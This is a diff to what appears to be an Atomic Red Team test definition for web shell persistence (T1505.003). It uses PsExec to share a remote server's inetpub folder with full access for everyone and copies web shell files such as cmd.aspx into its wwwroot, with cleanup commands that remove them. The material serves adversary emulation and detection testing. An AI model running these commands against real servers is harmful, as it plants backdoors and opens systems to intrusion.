@@ -12,16 +12,16 @@ atomic_tests:
   input_arguments:
     server:
       description: server's IP
-      type: IP
-      default: 192.168.1.100
-    web_shell_path:
-      description: The path to drop the web shell
-      type: string
-      default: C:\inetpub\wwwroot
+      type: String
+      default: 192.168.1.100    
     web_shells:
       description: Path of Web Shell
       type: path
-      default: PathToAtomicsFolder\T1505.003\src
+      default: PathToAtomicsFolder\T1505.003A\src    
+    psexec_exe:
+      description: Path to PsExec executable
+      type: Path
+      default: PathToAtomicsFolder\T1505.003A\bin\PsExec64.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -35,11 +35,13 @@ atomic_tests:
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
   executor:
     command: |
-      psexec64 \\#{server} net share inetpub=c:\inetpub /grant:everyone,full"
-      copy test.txt \\192.168.1.100\inetpub\wwwroot
-      xcopy /I /Y #{web_shells} #{web_shell_path}
-    cleanup_command: |
-      del #{web_shell_path}\b.jsp /q >nul 2>&1
-      del #{web_shell_path}\tests.jsp /q >nul 2>&1
-      del #{web_shell_path}\cmd.aspx /q >nul 2>&1
+      #{psexec_exe} \\#{server} net share inetpub=c:\inetpub /grant:everyone,full
+      net use \\#{server}\inetpub
+      xcopy /I /Y #{web_shells} \\#{server}\inetpub\wwwroot
+    cleanup_command: |      
+      del \\#{server}\inetpub\wwwroot\b.jsp /q >nul 2>&1
+      del \\#{server}\inetpub\wwwroot\tests.jsp /q >nul 2>&1
+      del \\#{server}\inetpub\wwwroot\cmd.aspx /q >nul 2>&1
+      net use \\#{server}\inetpub /delete
+      #{psexec_exe} \\#{server} net share inetpub /delete
     name: command_prompt
